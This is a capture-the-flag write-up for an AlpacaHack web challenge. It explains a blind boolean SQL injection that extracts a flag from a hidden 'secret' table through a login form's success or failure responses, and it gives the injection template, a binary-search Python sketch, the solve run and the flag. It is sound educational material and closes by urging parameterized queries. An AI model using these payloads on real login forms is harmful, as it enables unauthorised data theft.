# [web] secret-table-3

> Login tells you only success/failure — a textbook blind boolean SQL injection to exfiltrate the flag from another table.

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | web |
| Difficulty | ★★☆☆☆ |
| Date | 2026-11-03 |
| Flag | `Alpaca{This_1s_wh4t_i5_called_blind_sql_injection}` |

## Problem Statement

> You can't leak the flag because you can only see your login success or failure, right?
>
> `secret-table-3.tar.gz`

## TL;DR

- `/login` runs `SELECT * FROM users WHERE username='{u}' AND password='{p}'` (string-formatted, no escaping) and responds only `Hello, user!` (a row matched) or `invalid credentials` (none).
- The flag lives in a separate table `secret(flag)`. Inject via `username`: `' OR (<cond>)-- ` → if `<cond>` true, `username='' OR TRUE` matches all rows → `Hello`; else no row → `invalid`. That's a 1-bit oracle.
- Binary-search each character: `(SELECT unicode(substr(flag,i,1)) FROM secret) < N`. Recover length first, then every char.

## Background Knowledge

### Blind boolean SQLi

When the app leaks only a yes/no signal, you still get one bit per request by injecting a boolean condition. `SELECT ... FROM secret` reaches the other table; `substr`/`unicode` + comparison turns each flag character into ~7 yes/no queries via binary search on its code point.

## Solution

```python
def oracle(cond):   # username = "' OR (" + cond + ")-- "
    return "Hello" in login(username, "x")

# length: smallest N with (SELECT length(flag) FROM secret) < N
# char i: binary-search N with (SELECT unicode(substr(flag,i,1)) FROM secret) < N → char = N-1
```

See [`solve.py`](solve.py). Validated locally (Flask + seeded flag), then run against the remote (~250 requests).

```bash
$ python3 solve.py http://34.170.146.252:9213
Alpaca{This_1s_wh4t_i5_called_blind_sql_injection}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| Python stdlib `urllib` | Boolean oracle + binary-search extraction |
| Flask (venv) | Local reproduction |

## Lessons Learned

- "Only success/failure" is still a full oracle; blind boolean injection reads any table (`secret`) one bit at a time. Use parameterized queries.

## Tags

`web` `sqli` `blind-sqli` `boolean-based` `sqlite`
